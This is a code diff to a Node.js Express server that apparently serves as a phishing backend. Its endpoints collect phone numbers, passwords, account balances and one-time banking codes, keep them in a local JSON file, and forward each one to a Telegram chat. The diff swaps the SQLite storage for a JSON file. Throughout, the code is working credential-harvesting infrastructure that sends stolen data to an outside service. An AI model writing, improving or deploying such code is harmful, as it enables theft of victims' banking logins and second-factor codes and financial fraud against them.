@@ -1,14 +1,41 @@
 const express = require("express");
 const fetch = require("node-fetch");
 const cors = require("cors");
-const Database = require("better-sqlite3");
+const fs = require("fs");
+const path = require("path");
 
 const app = express();
 app.use(express.json());
 app.use(cors());
 
-const db = new Database("events.db");
-db.exec("CREATE TABLE IF NOT EXISTS events (id INTEGER PRIMARY KEY AUTOINCREMENT, phone TEXT, password TEXT, otp TEXT, saldo TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
+// --- Simple JSON DB Implementation ---
+const DB_FILE = path.join(__dirname, "events.json");
+
+function getEvents() {
+  try {
+    if (!fs.existsSync(DB_FILE)) return [];
+    const data = fs.readFileSync(DB_FILE, "utf8");
+    return JSON.parse(data);
+  } catch (e) {
+    return [];
+  }
+}
+
+function saveEvent(event) {
+  const events = getEvents();
+  // Add ID and timestamp
+  event.id = events.length > 0 ? events[0].id + 1 : 1;
+  event.created_at = new Date().toISOString().replace("T", " ").substring(0, 19);
+  
+  // Prepend to keep newest first (like ORDER BY id DESC)
+  events.unshift(event);
+  
+  // Limit to 200 items
+  if (events.length > 200) events.length = 200;
+  
+  fs.writeFileSync(DB_FILE, JSON.stringify(events, null, 2));
+}
+// -------------------------------------
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "";
 const TELEGRAM_CHAT = process.env.TELEGRAM_CHAT || "";
@@ -23,7 +50,9 @@ app.post("/collect", async (req, res) => {
   const phone = String(req.body.phone || "");
   const password = String(req.body.password || "");
   const saldo = String(req.body.saldo || "");
-  db.prepare("INSERT INTO events (phone, password, saldo) VALUES (?, ?, ?)").run(phone, password, saldo);
+  
+  saveEvent({ phone, password, saldo });
+  
   const text = "📱 Datos\n\n📞 Celular: " + phone + "\n🔒 Contraseña: " + password + "\n💰 Saldo: " + saldo;
   try { await sendToTelegram(text); } catch (_) {}
   res.json({ ok: true });
@@ -32,14 +61,16 @@ app.post("/collect", async (req, res) => {
 app.post("/otp", async (req, res) => {
   const phone = String(req.body.phone || "");
   const otp = String(req.body.otp || "");
-  db.prepare("INSERT INTO events (phone, otp) VALUES (?, ?)").run(phone, otp);
+  
+  saveEvent({ phone, otp });
+  
   const text = "🔐 Dinámica\n📞 Celular: " + phone + "\n🧩 Código: " + otp;
   try { await sendToTelegram(text); } catch (_) {}
   res.json({ ok: true });
 });
 
 app.get("/api/events", (req, res) => {
-  const rows = db.prepare("SELECT id, phone, password, otp, saldo, created_at FROM events ORDER BY id DESC LIMIT 200").all();
+  const rows = getEvents();
   res.json(rows);
 });
 
